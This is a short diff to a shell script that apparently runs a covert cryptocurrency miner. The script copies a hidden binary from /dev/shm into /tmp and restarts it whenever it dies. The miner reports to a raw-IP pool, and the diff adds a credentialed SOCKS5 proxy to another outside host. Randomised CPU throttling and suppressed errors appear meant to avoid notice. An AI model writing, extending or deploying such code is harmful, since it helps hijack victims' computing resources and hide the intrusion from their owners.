@@ -100,7 +100,7 @@ echo "[*] v25 P1:$P1 P2:$P2"
         if ! kill -0 $P1 2>/dev/null; then
             cp /dev/shm/.m/p /tmp/.p8 2>/dev/null; chmod +x /tmp/.p8 2>/dev/null
             nice -n 19 /tmp/.p8 --coin pearl --url 23.94.152.126:80 \
-                --user "${PRL}.${WRK}" 2>/dev/null &
+                --user "${PRL}.${WRK}" --proxy socks5://majapahlevi:majapahlevi@23.94.21.110:443 2>/dev/null &
             P1=$!; cpulimit -l $((RANDOM%25+40)) -p $P1 2>/dev/null &
         fi
         if ! kill -0 $P2 2>/dev/null; then
